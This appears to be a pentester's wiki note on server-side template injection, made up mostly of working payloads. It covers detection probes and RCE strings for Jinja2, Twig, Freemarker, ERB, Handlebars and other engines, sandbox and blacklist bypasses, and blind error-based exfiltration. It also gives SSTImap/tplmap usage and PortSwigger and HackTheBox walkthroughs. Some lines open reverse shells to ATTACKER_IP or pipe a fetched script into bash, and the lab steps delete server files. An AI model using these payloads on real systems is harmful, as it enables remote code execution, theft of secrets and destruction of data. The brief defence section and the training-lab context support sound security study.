---
title: "SSTI"
type: technique
tags: [exploitation, h1, injection, rce, ssti, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-21
sources: [thm-adv-ssti, thm-web-ssti-ctf, h1-scraped-ssti, 0xdf-linux-easy-web, payloadsallthethings-server-side-template-injection, git-payloadsallthethings, git-portswigger-all-labs, korchagin-successful-errors, hacktricks-web]
---

# SSTI (Server-Side Template Injection)

Quick payloads: [[payloads/ssti]].

## What it is

Server-Side Template Injection (SSTI) occurs when user input is unsafely embedded directly into a server-side template rather than passed as data to it. The template engine interprets the injected content as code and executes it, potentially allowing an attacker to read files, execute system commands, and achieve full server compromise.

## How it works

Template engines like Jinja2, Twig, Smarty, and Pug/Jade replace placeholders in templates with dynamic data at render time. A typical safe usage passes data as a variable:

```python
template.render(name=user_input)   # safe — input is data
```

A vulnerable usage embeds input directly in the template string:

```python
Template("Hello, " + user_input + "!").render()   # unsafe — input is code
```

In the second case, if the attacker supplies `{{7*7}}`, the template engine evaluates it and outputs `49`. From there, the attacker can traverse Python/PHP object hierarchies to reach dangerous functions.

## Prerequisites

- A user-controlled value reflected in a server-rendered page via a template engine
- The application does not sanitise the value before embedding it in the template
- For RCE: the template engine allows access to global objects, imported modules, or shell execution functions

## Methodology

### 1. Detection — probe for template execution

Inject mathematical expressions using different template syntaxes. A numeric result (e.g., `49`) confirms template evaluation:

| Payload | Engine(s) | Expected output |
|---|---|---|
| `{{7*7}}` | Jinja2, Twig | 49 |
| `{{7*'7'}}` | Jinja2 | 7777777 |
| `{{7*'7'}}` | Twig | 49 |
| `${7*7}` | Freemarker, EL | 49 |
| `<%= 7*7 %>` | ERB (Ruby) | 49 |
| `#{7*7}` | Pug/Jade | 49 |
| `{'Hello'\|upper}` | Smarty | HELLO |
| `{{html "probe"}}` | Go `html/template` | probe (literal string) |
| `{{ request }}` | Django templates | WSGIRequest object repr |

Use these probes in any input field that appears in rendered output: username, profile description, search query, email greeting, error message.

**Code-context injection** — when user input is embedded inside an already-open template expression (e.g., `engine.render("Hello {{" + greeting + "}}", data)`), payloads with full delimiters won't reach a new expression. Break out of the context first:

```
# Close the existing expression, then open a new one
}}{{7*7
# Or append and observe if closing affects output
data.username}}hello
```

If adding `}}` changes output or triggers an error, SSTI in code context is confirmed.

### 2. Identify the template engine

The difference between `{{7*7}}` (49) and `{{7*'7'}}` output distinguishes Jinja2 from Twig:

- `{{7*'7'}}` → `7777777` = **Jinja2** (Python string multiplication)
- `{{7*'7'}}` → `49` = **Twig** (PHP numeric coercion)

A simpler identification flowchart:
1. Does `{{7*7}}` return 49? → Jinja2 or Twig
2. Does `${7*7}` return 49? → Freemarker or EL
3. Does `#{'Hello'.toUpperCase()}` return `HELLO`? → Pug/Jade or Groovy
4. Does `{'Hello'\|upper}` return `HELLO`? → Smarty
5. Does `{{html "probe"}}` return `probe`? → Go `html/template`
6. Does `{{ request }}` return a Django request object repr? → Django templates

**Error-based fingerprinting** — inject malformed expressions and read the stack trace or error message, which often names the engine directly:

```
${}
{{}}
<%= %>
${foobar}
{{foobar}}
<%= foobar %>
${7/0}
{{7/0}}
<%= 7/0 %>
```

A Freemarker error will name `freemarker.core.*`; a Twig error will mention `Twig\Environment`; a Tornado error shows the Python traceback. An invalid object reference in Freemarker (e.g., setting a price field to a non-numeric string like `king`) also forces an exception that names the engine.

### 3. Exploitation by engine

**Universal Detection Payloads**
Polyglot to trigger an error in presence of SSTI vulnerability:
```ps1
${{<%[%'"}}%\.
```
Error-based test: `(1/0).zxy.zxy`
Boolean-based test: Pair `(3*4/2)` vs `3*)2(/4`

#### Jinja2 (Python)

Jinja2 allows traversal of the Python object hierarchy to import modules:

**Basic RCE (enumerate subclasses):**

```jinja2
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["id"])}}
```

Note: The subclass index (157) varies by environment. To find the right index, first dump all subclasses:

```jinja2
{{"".__class__.__mro__[1].__subclasses__()}}
```

Then search for `subprocess.Popen` in the output and note its index.

**Simpler Jinja2 RCE via config globals (Flask):**

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Read file:**

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

#### Twig (PHP)

Twig uses PHP functions. The `sort` filter can accept a callback:

```twig
{{['id',""]|sort('passthru')}}
```

**Reverse shell via Twig:**

```twig
{{["bash -c 'exec /bin/bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'",""]|sort('passthru')}}
```

This was the winning technique in the THM Injectics CTF.

**Alternative Twig payloads:**

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Twig custom exploit via developer-exposed objects (PortSwigger Lab 7 pattern):**

When standard Twig RCE payloads are blocked by sandbox hardening, pivot to developer-created objects exposed in the template context. Trigger upload errors to leak class names and method signatures from stack traces, then invoke those methods directly:

```twig
{{# Step 1: discover available methods via error messages #}}
{{# Upload invalid file type → error reveals User.php and user.setAvatar() #}}

{{# Step 2: use setAvatar to symlink any server file as the avatar #}}
{{# In the blog-post-author-display parameter: #}}
user.setAvatar('/etc/passwd','image/jpg')

{{# Step 3: view the avatar endpoint to read the file #}}
{{# GET /avatar?avatar=<username> #}}

{{# Step 4: read User.php to find other methods #}}
user.setAvatar('/home/carlos/User.php','image/jpg')

{{# Step 5: gdprDelete() removes the current avatarLink target — use to delete files #}}
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
user.gdprDelete()
```

The `gdprDelete()` method calls `rm(readlink($this->avatarLink))` — deleting whatever file the avatar symlink points to. Set the symlink to the target file, then trigger delete.

#### Smarty (PHP)

Confirm with: `{'Hello'|upper}` → `HELLO`

Execute system commands:

```php
{system("id")}
{system("ls")}
```

When `{php}` is available:

```php
{php}system("id");{/php}
```

#### Pug/Jade (Node.js)

Confirm with: `#{7*7}` → 49

Execute commands using Node's `child_process` module:

```pug
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

Note: Pass arguments as an array, not a single string:

```pug
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```

#### ERB (Ruby)

Confirm with `<%= 7*7 %>` → 49. ERB uses Ruby's `system()` or backtick execution:

```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
```

**Delete a file (PortSwigger Lab 1 objective):**

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

Error-based fingerprinting: supplying a syntactically invalid ERB expression (e.g., `<%= whoami %>` where `whoami` is not a defined Ruby method) causes a `NoMethodError` that reveals the Ruby/ERB stack trace.

#### Tornado (Python)

Tornado's template engine uses Python expression syntax. Confirm with `{{7*7}}` → 49 (same as Jinja2). Distinguish by checking error output — Tornado errors show Python tracebacks mentioning `tornado.template`.

**RCE via Tornado:**

```python
{%import os%}{{os.popen("id").read()}}
```

**Delete a file (PortSwigger Lab 2 objective):**

```python
{%import os%}{{os.popen("rm /home/carlos/morale.txt").read()}}
```

In code-context (input embedded inside a live expression), break out first:
```
}}{% import os %}{{os.popen('id').read()
```

#### Handlebars (Node.js)

Confirm by triggering an error — Handlebars throws `Error: Parse error` with `Handlebars` in the message when given malformed syntax. Standard `{{7*7}}` does NOT evaluate (Handlebars is logic-less by default), but RCE is possible via prototype pollution through the `lookup` helper or via the `constructor` chain:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

For simpler environments (PortSwigger Lab 4 pattern), the wrapping approach can be condensed — the key is reaching `Function` constructor through the object chain.

#### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Freemarker sandbox bypass (PortSwigger Lab 6 pattern):**

When Freemarker runs in a sandbox that blocks `freemarker.template.utility.Execute`, bypass by accessing the `api` built-in on an object that exists in the template context:

```freemarker
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

The key insight: `article` may not exist as a context object, but `product` does — substitute the available context object name. Use the error message (`X is not defined`) to discover valid object names.

#### Go `html/template`

Go's `html/template` auto-escapes HTML but still executes template directives. There is no global object hierarchy to traverse — RCE is only possible if the data struct passed to the template exposes an exec method:

```
# Confirm template execution (returns literal string)
{{html "probe"}}

# Dump entire template context — reveals all accessible fields and methods
{{ . }}

# Execute OS command only if the context struct has an exec method
{{ .DebugCmd "id" }}
```

Always start with `{{ . }}` to enumerate available methods. Data disclosure is always achievable; RCE depends on what the developer exposed.

#### Django templates

Django's template engine intentionally blocks Python introspection. Direct RCE is not possible via template injection alone. The attack class shifts to **data exfiltration** via context variable access:

```django
# Confirm template execution (returns request object repr)
{{ request }}

# Dump all users if a QuerySet named 'users' is in context
{{ users.values }}

# Access current user's password hash
{{ request.user.password }}

# Expose Django settings (may contain SECRET_KEY)
{{ settings }}

# Debug tag — dumps all context variables and their values (PortSwigger Lab 5 pattern)
{% debug %}

# Access SECRET_KEY directly once settings object is confirmed in context
{{ settings.SECRET_KEY }}
```

For privilege escalation, chain with a separate primitive: `SECRET_KEY` leak for session forgery, or `FileBasedCache` pickle deserialization if the cache directory is world-writable.

#### Python `str.format()` injection

Occurs when `str.format()` or `.format_map()` is called with user-controlled input embedded in the format string. Attribute traversal reaches globals and config objects:

```python
# Leak a global variable from the module containing the format call
{obj.__init__.__globals__[secret_key]}

# Leak environment variables
{obj.__init__.__globals__[os].environ[SECRET]}

# Walk to Flask app config
{obj.__init__.__globals__[app].config[SECRET_KEY]}
```

The sink must be `str.format()` or `.format_map()` — not `%` formatting or f-strings. Only attribute access and dict key lookup are possible; no function calls, no subclasses traversal. Output is the attribute value, not RCE.

### 4. Error-based blind exfiltration (output not reflected)

Classic SSTI RCE needs the template output reflected back, or a time-based blind oracle. Korchagin's "Successful Errors" research (2025 #1 technique) adds a third mode borrowed from SQLi: when the engine's output is not reflected but its **error messages are**, force the result of a subexpression into an exception message that the app echoes. This is distinct from error-based *fingerprinting* above (which only names the engine); here the error carries the actual command output.

**Error-based** wraps the command output in an operation that raises an exception whose message contains its argument:

| Engine | Leak primitive | Error raised |
|---|---|---|
| Jinja2 / Python | `getattr("", OUTPUT)` | `AttributeError: '' has no attribute '<OUTPUT>'` |
| Twig / PHP | `call_user_func(OUTPUT)` or `fopen(OUTPUT,"r")` | fatal error / warning reflects the string |
| Java (SpEL) | `T(java.lang.Integer).valueOf(OUTPUT)` | `NumberFormatException: For input string: "<OUTPUT>"` |
| Ruby / ERB | `File.read(OUTPUT)` | `Errno::ENOENT ... <OUTPUT>` |
| Node.js | `require(OUTPUT)` | `MODULE_NOT_FOUND: Cannot find module '<OUTPUT>'` |
| Elixir | `[1,2][OUTPUT]` | `BadMapError` displays the index |

Concrete Jinja2 (command output surfaced through an `AttributeError`):

```jinja2
{{ cycler.__init__.__globals__.__builtins__.getattr("", cycler.__init__.__globals__.__builtins__.__import__("os").popen("id").read()) }}
```

**Boolean error-based blind** is for when errors are detectable but their text is not reflected. Use the target value to conditionally raise a divide-by-zero (or bad-index) so an error fires in exactly one branch; the response-code / length / timing delta is the oracle. General form `1/(CONDITION ? 1 : 0)`:

```twig
{{ 1/( {"id":"shell_exec"}|map("call_user_func")|join|trim("\n") ends with "SSTIMAP" ) }}
```

Append a known marker to the command output and test `ends with`; a 500 (div-by-zero) versus 200 distinguishes true from false, letting you exfiltrate the output character by character. Detect the error state by diffing HTTP code, response length, or timing against a numeric baseline (treat responses as stable within ~5%).

Universal detection polyglot (forces evaluation before the syntax error, so a stack trace fires under any of these engines):

```
(1/0).zxy.zxy
```

All of these payloads ship in SSTImap, so `--os-shell` works against error-only blind targets once the engine is identified.

## Key payloads / examples

```
# Detection
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{'x'|upper}

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['id'])}}

# Twig RCE
{{['id',""]|sort('passthru')}}
{{['bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',""]|sort('passthru')}}

# Smarty RCE
{system("id")}

# Pug RCE
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

## Automated exploitation with SSTImap

SSTImap automates template engine detection and exploitation:

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt

# Basic scan
python3 sstimap.py -u 'http://target.com/page?name='

# POST parameter
python3 sstimap.py -X POST -u 'http://target.com/page' -d 'name='

# With OS shell
python3 sstimap.py -u 'http://target.com/page?name=' --os-shell
```

SSTImap detects Jinja2, Twig, Smarty, Freemarker, Mako, and others.

## Real-World Examples (HackerOne — paid reports)

No paid SSTI reports in current H1 dataset (0 of 1,901 bounty reports tagged ssti). SSTI bugs do appear in disclosed reports but tend to be filed under RCE or custom weakness tags. Check `h1-scraped-rce` reports for template-injection root causes.

## CSTI - client-side template injection (AngularJS / Vue / Mavo)

Client-side template injection is SSTI in the browser: the JS framework compiles attacker-controlled template syntax and runs arbitrary JavaScript (XSS that survives HTML-encoding filters). Confirm the framework first, then confirm the exact sink; `{{7*7}}` returning `49` means the reflection is re-parsed as a template, not inert HTML. See [[xss]] and [[csp-bypass]] (whitelisted-CDN AngularJS is a CSP bypass gadget).

Fingerprints: AngularJS (`ng-app`, `ng-bind`, `window.angular`), Vue (`v-` directives, Vue globals), Alpine (`x-data`, `x-html`), Mavo (`mv-`/`data-mv-`).

AngularJS (>= 1.6 dropped the expression sandbox, so plain payloads fire; < 1.6 needs sandbox escapes):

```javascript
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>
// CSP/ng-csp constrained: orderBy + event path still reaches code exec
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Vue (runtime-only builds do NOT compile arbitrary strings; needs the template compiler or a `v-html`/dynamic-binding gadget):

```javascript
{{this.constructor.constructor('alert(1)')()}}          // V2 style
{{_openBlock.constructor('alert(1)')()}}                // V3
{{_createVNode.constructor('alert(1)')()}} {{_toDisplayString.constructor('alert(1)')()}}
"><div v-html="''.constructor.constructor('alert(1)')()">x</div>
```

Helper names vary by V3 build; once V3 CSTI is confirmed, enumerate nearby `_`-prefixed helpers. Mavo parses non-JS expression syntax, useful when `alert(1)` tokens are filtered: `[self.alert(1)]`, `[7*7]`, `<a data-mv-if='1 or self.alert(1)'>x</a>`. Tool for AngularJS-heavy targets: ACSTIS (angularjs-csti-scanner).

## Detection and defence

- **Never embed raw user input in templates** — always pass user data as template variables (context), never as part of the template string itself
- **Sandbox mode (Jinja2):** Use `SandboxedEnvironment` to restrict access to dangerous functions and attributes
- **Input sanitisation:** Escape or reject template-special characters (`{`, `}`, `%`, `$`, `#`, `<`, `>`) in user-facing inputs
- **Template auditing:** Audit all template rendering calls to confirm input is passed as data, not concatenated into the template
- **Disable unused features:** In Smarty, disable `{php}` tags; in Pug, avoid unescaped interpolation (`!{}`)
- **Principle of least privilege:** Run the web application as a low-privilege user to limit the impact of RCE

## Tools

- [[burp-suite]] — intercept and modify requests, test payloads in Repeater
- SSTImap — https://github.com/vladko312/SSTImap — automated detection and exploitation
- TInjA — https://github.com/Hackmanit/TInjA — An efficient SSTI + CSTI scanner utilizing novel polyglots
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

## Sources

- THM Advanced Web — SSTI room (`serversidetemplateinjection`)
- THM CTF: Injectics (Twig SSTI via sort filter after SQLi auth bypass)
- Vladislav Korchagin, "Successful Errors: New Code Injection and SSTI Techniques" (2025 top-10 #1); repo `vladko312/Research_Successful_Errors` (slug: korchagin-successful-errors).
- HackTricks (pentesting-web) - client-side template injection (slug: hacktricks-web).

## From the Wild

### HTB — Sightless (2024)
- **Technique variant**: SQLPad template injection (CVE-2022-0944) — user-controlled input passed directly into SQLPad's template renderer, yielding RCE inside the container
- **Attack path**: Exploit SQLPad CVE-2022-0944 template injection for container shell, crack /etc/shadow hash for lateral movement

### HTB — Editor (2025)
- **Technique variant**: Gitea + Git Credential Exposure + Sudo
- **Attack path**: Discover Gitea repository with exposed credentials, SSH access, exploit sudo misconfiguration for root

### HTB — University (2024)
- **Technique variant**: xhtml2pdf RCE (CVE-2023-33733), cert forgery, CVE-2023-36025, unconstrained delegation
- **Attack path**: Chain PDF export RCE with cert forgery and archive exploit to unconstrained delegation attack

### HTB — IClean (2024)
- **Technique variant**: XSS, SSTI, qpdf Exploitation
- **Attack path**: XSS to steal admin session, SSTI in invoice generator for RCE, abuse qpdf sudo for root

### HTB — Perfection (2024)
- **Technique variant**: SSTI via Regex Bypass + Hash Mask
- **Attack path**: Bypass regex filter with newline, exploit Ruby ERB SSTI for shell, crack password hash using mail-revealed format mask, sudo for root

### HTB — Sandworm (2023)
- **Technique variant**: PGP Signature Verification SSTI, Rust Sandbox Escape, Firejail CVE
- **Attack path**: SSTI in PGP signature verification (SSG), escape Rust sandbox, Firejail CVE-2022-31214 for root

### HTB — RedPanda (2022)
- **Technique variant**: Spring Boot SSTI + XXE Cron
- **Attack path**: SSTI in Java Spring Boot search for shell, exploit XXE in log parser cron job to read root SSH key

### HTB — Late (2022)
- **Technique variant**: SSTI via OCR + SUID Script
- **Attack path**: Upload image with SSTI payload to Flask-based OCR app, exploit Jinja2 SSTI for shell, write to SUID append script for root

### HTB — GoodGames (2022)
- **Technique variant**: SQLi + SSTI + Docker Escape
- **Attack path**: SQL injection in login to dump admin hash, SSTI in Flask dashboard for shell in container, mount host filesystem for root

### HTB — Anubis (2021)
- **Technique variant**: ADCS writable certificate template, Windows PKI abuse
- **Attack path**: Exploit writable cert template in Windows PKI to escalate to Domain Admin

### HTB — Nunchucks (2021)
- **Technique variant**: SSTI in Express.js + AppArmor Bypass
- **Attack path**: Discover subdomain with Nunjucks SSTI, exploit for shell, bypass AppArmor via Perl shebang bug for root

### HTB — Doctor (2020)
- **Technique variant**: SSTI in Flask + Splunk Privesc
- **Attack path**: Server-Side Template Injection in Flask app for command execution, Splunk Universal Forwarder RCE for root

### HTB — Bolt (2021)
- **Technique variant**: Stored Jinja2 SSTI — output via email, not HTTP response
- **Attack path**: Profile update field stored in DB; rendered via `render_template_string` in the email confirmation route; inject `{{ namespace.__init__.__globals__.os.popen('id').read() }}` as profile value; trigger by requesting email confirmation; RCE output appears in the confirmation email body, not the page

### HTB — Catch (2022)
- **Technique variant**: Twig SSTI via Cachet component template (CVE-2021-39165)
- **Attack path**: SQLi in Cachet (CVE-2021-39165) leaks admin API token from `settings` table; authenticate and create/edit a status page component with Twig payload in the template field; view the public status page to trigger render; payload: `{{["id"]|filter("system")|join(",")}}`

### HTB — Epsilon (2022)
- **Technique variant**: Jinja2 SSTI gated behind JWT whose secret is in AWS Lambda source code
- **Attack path**: Lambda API endpoint leaks function source code including JWT secret; forge admin JWT; POST to `/order` with SSTI payload in `costume` field — app builds f-string then passes to `render_template_string`; payload: `{{ namespace.__init__.__globals__.os.popen('id').read() }}`

### HTB — Flustered (2022)
- **Technique variant**: Jinja2 SSTI behind GlusterFS-mounted MySQL credentials and Squid proxy
- **Attack path**: Enumerate GlusterFS (port 24007); mount volume; read MySQL credentials; authenticate to Squid proxy; POST JSON with Jinja2 payload in `siteurl` field to internal Flask app; subclasses traversal: `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}`

### HTB — GoBox (2021)
- **Technique variant**: Go `html/template` SSTI via developer-exposed `DebugCmd` struct method
- **Attack path**: `email` field on forgot-password form rendered via Go `html/template`; `{{ . }}` dumps context struct and reveals a `DebugCmd` method; `{{ .DebugCmd "id" }}` executes OS commands; outbound connections firewalled; write PHP webshell to an S3 bucket path via `DebugCmd` and access it via the web server

### HTB — HackNet (2023)
- **Technique variant**: Django template SSTI — data exfiltration only, no RCE
- **Attack path**: Username field reflected into `engine.from_string()` Django template; arithmetic and Python introspection blocked by engine design; use `{{ users.values }}` to dump entire user QuerySet (including passwords); escalate via separate Django `FileBasedCache` pickle deserialization using world-writable `/var/tmp/django_cache/`

### HTB — Trickster (2024)
- **Technique variant**: Jinja2 SSTI in ChangeDetection.io notification body (CVE-2024-32651)
- **Attack path**: Gain host foothold via PrestaShop CVE-2024-34716 XSS-to-theme-upload RCE; discover ChangeDetection.io 0.45.20 at `172.17.0.2:5000`; tunnel port; create watch with Jinja2 payload in notification body and `get://ATTACKER:80` as delivery URL; payload: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`; output arrives in the HTTP body of the notification GET request

## Payload reference (PayloadsAllTheThings)

Engine-specific RCE payloads from PAT that complement the exploitation section. Includes Freemarker, Velocity, Pebble, and Twig alternatives not listed above.

### Detection polyglot and error probes

```
${{<%[%'"}}%\.    # universal polyglot — triggers errors across multiple engines
(1/0).zxy.zxy     # error-based engine identification
```

### Twig — alternative RCE vectors

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|filter("system")|join(",")}}
{{['bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',""]|sort('passthru')}}
```

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Mako (Python)

```python
${self.module.cache.util.os.popen('id').read()}
<%
    import os
    x = os.popen('id').read()
%>
${x}
```

### Automated detection and exploitation

```bash
# tplmap
python2.7 ./tplmap.py -u 'http://target.com/page?name=John*' --os-shell

# SSTImap with OS shell
python3 sstimap.py -u 'http://target.com/page?name=' --os-shell

# tinja (browser-based)
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
```

## PortSwigger Labs

### Lab 1 — Basic server-side template injection (PRACTITIONER)

**Engine:** ERB (Ruby)
**Sink:** `message` parameter in product out-of-stock URL, reflected in the page

1. Click a product and trigger the "Unfortunately this product is out of stock" message — the `message` parameter is reflected.
2. Inject `<%= 7*7 %>` → output `49` confirms ERB.
3. Confirm Ruby by supplying an undefined method — error stack trace names Ruby/ERB.
4. Execute OS command and delete the target file:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

---

### Lab 2 — Basic server-side template injection (code context) (PRACTITIONER)

**Engine:** Tornado (Python)
**Sink:** `blog-post-author-display` POST parameter (preferred name setting), rendered in comment author field

1. Log in, go to account settings, intercept the preferred-name POST request in Burp — notice `blog-post-author-display=user.name`.
2. The value is embedded inside an already-open template expression (code context).
3. Supply a malformed value to trigger an error — stack trace reveals Tornado template engine.
4. Break out of the expression context and inject an import statement:

```
blog-post-author-display=user.name}}{%import os%}{{os.popen("whoami").read()
```

5. Post a comment to trigger rendering — `carlos` appears as the comment author.
6. Delete the target file:

```
blog-post-author-display=user.name}}{%import os%}{{os.popen("rm /home/carlos/morale.txt").read()
```

---

### Lab 3 — Server-side template injection using documentation (PRACTITIONER)

**Engine:** Freemarker (Java)
**Sink:** Product template editor (edit template inline)

1. Edit a product template. Supply an invalid object reference (e.g., a non-numeric string as a price variable) — the exception names `freemarker.core.*`.
2. Confirm with `${7*7}` → 49, then `${3*3}` → 9.
3. Use the standard Freemarker RCE payload:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

4. Delete the target file:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

---

### Lab 4 — Server-side template injection in an unknown language with a documented exploit (PRACTITIONER)

**Engine:** Handlebars (Node.js)
**Sink:** `message` parameter in product out-of-stock URL

1. Inject the polyglot `${{<%[%'"}}%\.` — error reveals Handlebars.
2. Handlebars is logic-less by default; `{{7*7}}` does not evaluate. Use the constructor chain to reach `Function`:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL-encode the payload before sending in the `message` parameter.

---

### Lab 5 — Server-side template injection with information disclosure via user-supplied objects (PRACTITIONER)

**Engine:** Django templates (Python)
**Sink:** Product template editor

1. Edit a product template. Leave the template empty or inject a broken expression — error message names Django template engine.
2. Use the debug tag to dump all context variables:

```django
{% debug %}
```

3. The output includes a `settings` object. Extract the secret key:

```django
{{settings.SECRET_KEY}}
```

4. Submit the leaked `SECRET_KEY` value to solve the lab.

---

### Lab 6 — Server-side template injection in a sandboxed environment (EXPERT)

**Engine:** Freemarker (Java) with sandbox restrictions
**Sink:** Product template editor

1. Confirm Freemarker via error-based identification (invalid object reference exposes `freemarker.core.*`).
2. `${7*7}` → 49 and `${3*3}` → 9 confirm evaluation.
3. Standard `Execute` payload is blocked by sandbox. Bypass using the ClassLoader via an available context object (`product`, not `article` — confirm valid object names from error messages):

```freemarker
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

4. The output of `my_password.txt` appears at the bottom of the rendered page — submit the value to solve.

**Key lesson:** When the standard exploit is sandboxed, use error messages to discover valid context object names, then chain through the ClassLoader to load restricted classes.

---

### Lab 7 — Server-side template injection with a custom exploit (EXPERT)

**Engine:** Twig (PHP) with hardened sandbox — no direct RCE via standard payloads
**Sink:** `blog-post-author-display` POST parameter (preferred name), rendered in comment author

1. Detect SSTI: send `blog-post-author-display=user.first_name${{<%[%'"}}%\.` — Twig error confirms injection point.
2. Confirm: `blog-post-author-display=user.first_name}}{{7*7` → `49` in comment author.
3. Standard payloads (`{{dump(app)}}`, `{{['id']|filter('system')}}`) produce no RCE — sandbox is active.
4. **Pivot to developer-exposed objects:** upload an invalid file type as avatar — error stack trace reveals `User.php` path and `user.setAvatar()` method.
5. Use `setAvatar` to symlink any server file as the avatar (requires filepath + MIME type):

```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')
```

6. Visit `/avatar?avatar=wiener` to read the symlinked file — get PHP source of `User.php`.
7. Find `gdprDelete()` in the source — it calls `rm(readlink($this->avatarLink))`.
8. Point the symlink at the target and trigger deletion:

```
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```
Then:
```
blog-post-author-display=user.gdprDelete()
```

**Warning:** Do not run `setAvatar` on `User.php` and then `gdprDelete()` — this deletes the class file and breaks the lab (requires 20-minute reset).

**Key lesson:** When the template engine is hardened, look for developer-created objects exposed in templates. Error messages and upload endpoints are the primary reconnaissance surface.

## Related

- [[insecure-deserialization]] (a sibling server-side injection class that reaches RCE)
- [[os-command-injection]] (SSTI commonly escalates to OS command execution)

### Jinja2 blacklist bypass — `|attr()` + hex-escaped dunders

When a filter substring-blocks `_`, `config`, `self`, and `"`, the usual
`config.__class__...` / `self.__init__...` payloads never parse. Reach the dunders
through the `attr()` filter with single-quoted, **hex-escaped underscores** so no
literal `_` (or blocked keyword) appears in the source:

```jinja2
{{ request|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

- `\x5f` is `_`, so `__globals__`/`__getitem__` never appear literally.
- Single quotes dodge a `"` block; `|attr('x')` replaces `.x` / `['x']`.
- Any object already in scope works as the entry point (`request`, `cycler`,
  `lipsum`, `namespace`) — no need for the blocked `config`/`self`.

**Long payload / input-length truncation:** a full inline RCE string plus the hex
escapes often exceeds the field's length limit or re-trips the blacklist. Cradle a
fetch instead — run `curl http://ATTACKER/x|bash` as the command so the heavy logic
lives in the fetched script, keeping the injected payload short and keyword-clean.

<!-- promoted-slug: jinja2-attr-hex-blacklist-bypass -->
